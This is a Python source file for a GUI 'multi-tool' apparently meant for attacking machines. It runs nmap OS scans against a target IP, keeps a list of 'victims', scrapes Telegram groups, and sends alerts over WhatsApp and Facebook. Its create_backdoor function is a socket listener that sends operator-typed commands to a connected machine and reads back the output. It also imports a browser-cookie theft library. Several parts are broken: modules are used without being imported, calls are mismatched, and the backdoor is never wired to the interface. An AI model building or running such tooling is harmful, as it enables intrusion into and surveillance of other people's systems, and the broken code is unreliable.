import socket
import subprocess
import nmap
import threading
import logging
from logging.handlers import RotatingFileHandler
import browser_cookie3
import pyautogui  # Replaced autopy with pyautogui
import requests
import pywhatkit as kit
from facebook_business.api import FacebookAdsApi
from facebook_business.adobjects.page import Page
import openai
import os
import sys
import asyncio
from telehunting import Telehunting
from PySide6.QtWidgets import QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QWidget, QTabWidget, QLineEdit
from PySide6 import QtCore
import importlib.metadata  # Replaces old metadata package

# ===================== Logging Setup ===================== #
if not os.path.exists('logs'):
    os.makedirs('logs')

log_file = os.path.join('logs', 'multi_tool.log')
log_handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024, backupCount=5)
logging.basicConfig(handlers=[log_handler], level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants for Bot Setup
LHOST = "localhost"
RHOST = "target_ip"
PROXY = "proxy_ip:proxy_port"
NMAP_ARGS = "-Pn -sT -O"

# API Credentials from config file
with open('config/api_credentials.json', 'r') as cred_file:
    api_credentials = json.load(cred_file)

FACEBOOK_TOKEN = api_credentials['facebook_access_token']
WHATSAPP_PHONE_NUMBER = api_credentials['whatsapp_phone_number']
TELEGRAM_USERNAME = api_credentials['telegram_username']  # Telehunting uses your account, not a bot token

# Initialize OpenAI API
openai.api_key = api_credentials["openai_api_key"]

# Initialize Facebook API
FacebookAdsApi.init(access_token=FACEBOOK_TOKEN)

# ===================== API Key Validation ===================== #
def validate_api_keys(output_area):
    """Validate that all necessary API keys are provided."""
    if not all([FACEBOOK_TOKEN, WHATSAPP_PHONE_NUMBER, openai.api_key, TELEGRAM_USERNAME]):
        output_area.append("Error: One or more API keys are missing. Check your config/api_credentials.json file.\n")
        logging.error("Missing API keys.")
        return False
    output_area.append("All API keys are present.\n")
    return True

# ===================== AI Error Handling ===================== #
def detect_and_fix_errors(error_message, output_area):
    """Use OpenAI to suggest fixes for detected errors."""
    try:
        response = openai.Completion.create(
            model="text-davinci-003",
            prompt=f"Error detected: {error_message}. Suggest a fix.",
            max_tokens=150
        )
        suggestion = response.choices[0].text.strip()
        output_area.append(f"AI Suggestion: {suggestion}")
    except openai.error.OpenAIError as e:
        output_area.append(f"OpenAI Error: {str(e)}")
        logging.error(f"OpenAI error: {str(e)}")
    except Exception as e:
        output_area.append(f"Unhandled error in AI detection: {str(e)}")
        logging.error(f"AI detection error: {str(e)}")

# ===================== Bot Notifications ===================== #
def whatsapp_notify(message, phone_number, output_area):
    """Send a WhatsApp message using pyWhatKit."""
    try:
        kit.sendwhatmsg_instantly(phone_number, message)
        output_area.append("WhatsApp message sent successfully.\n")
        logging.info(f"WhatsApp message sent to {phone_number}")
    except Exception as e:
        handle_exception(e, output_area)

def setup_facebook_bot(output_area):
    """Send a notification via Facebook using the official facebook_business SDK."""
    try:
        page = Page(FACEBOOK_TOKEN)
        page.create_post({
            'message': "Monitoring vulnerabilities.",
        })
        output_area.append("Facebook bot setup complete.")
    except Exception as e:
        handle_exception(e, output_area)

# ===================== Telegram Monitoring with Telehunting ===================== #
async def telegram_hunting(output_area):
    """Use Telehunting to scrape data from Telegram chats and groups."""
    try:
        telehunting = Telehunting(username=TELEGRAM_USERNAME)
        target_group = 'target_group_id'  # Replace with a target group or channel id
        await telehunting.connect()

        messages = await telehunting.get_messages(target_group, limit=5)  # Get the last 5 messages
        output_area.append(f"Monitoring Telegram Group: {target_group}\n")
        for msg in messages:
            output_area.append(f"Message: {msg.message}\n")

        await telehunting.disconnect()

    except Exception as e:
        handle_exception(e, output_area)

# ===================== Victim Monitoring ===================== #
victims = []

def add_victim(ip_address, output_area):
    """Monitor victim and notify via bots."""
    if not validate_ip(ip_address):
        output_area.append(f"Invalid IP address: {ip_address}\n")
        logging.error(f"Attempted to monitor invalid IP address: {ip_address}")
        return

    victims.append(ip_address)
    output_area.append(f"Monitoring victim: {ip_address}\n")

    message = f"Vulnerability detected at {ip_address}."
    asyncio.create_task(telegram_hunting(output_area))  # Using telegram_hunting for scraping
    whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)

def validate_ip(ip):
    """Validate if the given string is a valid IP address."""
    import re
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(ip_pattern, ip) is not None

# ===================== Scanning and Backdoor ===================== #
def scan_target(rhost, output_area):
    """Scan target using Nmap."""
    try:
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments=NMAP_ARGS)
        result = f"Target OS: {nm[rhost]['osclass'][0]['osfamily']}\n{nm.csv()}"
        output_area.append(result)
    except Exception as e:
        handle_exception(e)

def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
    """Create a backdoor and notify via bots."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.append(f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.append(f"Connection established with {addr}\n")

        message = f"Backdoor connection established with {addr}"
        asyncio.create_task(telegram_hunting(output_area))  # Using telegram_hunting for monitoring
        whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
        
        while not stop_event.is_set():
            cmd, ok = QtWidgets.QInputDialog.getText(None, "Command Input", "Enter command:")
            if not ok or cmd.lower() in ['exit', 'quit']:
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            output_area.append(response + '\n')
        conn.close()
    except Exception as e:
        handle_exception(e)

# ===================== Error Handling ===================== #
def handle_exception(exception, output_area=None):
    """Log and handle exceptions."""
    error_message = str(exception)
    logging.error(error_message)
    if output_area:
        output_area.append(f"Error: {error_message}")
        detect_and_fix_errors(error_message, output_area)

# ===================== GUI Application ===================== #
class MultiToolV4(QMainWindow):
    """Main GUI for MultiToolV4."""
    
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.stop_event = threading.Event()

    def init_ui(self):
        self.setWindowTitle('MultiToolV4 by kdairatchi')

        # Central Widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Tabs
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        # Bot Setup Tab
        self.add_bot_tab()
        
        # Victim Monitoring Tab
        self.add_victim_monitor_tab()

        # Error Handling Tab
        self.add_error_handling_tab()

        self.show()

    def add_bot_tab(self):
        """Add bot setup tab."""
        bot_tab = QWidget()
        self.bot_output = QTextEdit()
        setup_button = QPushButton("Setup Bots")
        setup_button.clicked.connect(lambda: self.setup_bots())
        layout = QVBoxLayout(bot_tab)
        layout.addWidget(self.bot_output)
        layout.addWidget(setup_button)
        self.tabs.addTab(bot_tab, "Bot Setup")

    def add_victim_monitor_tab(self):
        """Add victim monitoring tab."""
        victim_tab = QWidget()
        self.victim_output = QTextEdit()
        victim_ip_input = QLineEdit()
        add_victim_button = QPushButton("Add Victim")
        add_victim_button.clicked.connect(lambda: add_victim(victim_ip_input.text(), self.victim_output))
        layout = QVBoxLayout(victim_tab)
        layout.addWidget(victim_ip_input)
        layout.addWidget(self.victim_output)
        layout.addWidget(add_victim_button)
        self.tabs.addTab(victim_tab, "Victim Monitor")

    def add_error_handling_tab(self):
        """Add AI error handling tab."""
        error_handling_tab = QWidget()
        self.error_output = QTextEdit()
        layout = QVBoxLayout(error_handling_tab)
        layout.addWidget(self.error_output)
        self.tabs.addTab(error_handling_tab, "Error Handling")

    def setup_bots(self):
        """Setup bots and notify users via Telegram and WhatsApp."""
        if validate_api_keys(self.bot_output):
            try:
                message = "Bots connected to APIs."
                self.bot_output.append(message)
                asyncio.create_task(telegram_hunting(self.bot_output))  # Using Telehunting for monitoring
                setup_facebook_bot(self.bot_output)
            except Exception as e:
                handle_exception(e, self.bot_output)

    def start_backdoor_thread(self):
        self.stop_event.clear()
        threading.Thread(target=create_backdoor, args=(LHOST, 8080, self.bot_output, self.stop_event), daemon=True).start()

    def stop_backdoor_thread(self):
        self.stop_event.set()

# Main function to start the GUI application
def main():
    app = QApplication(sys.argv)
    gui = MultiToolV4()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()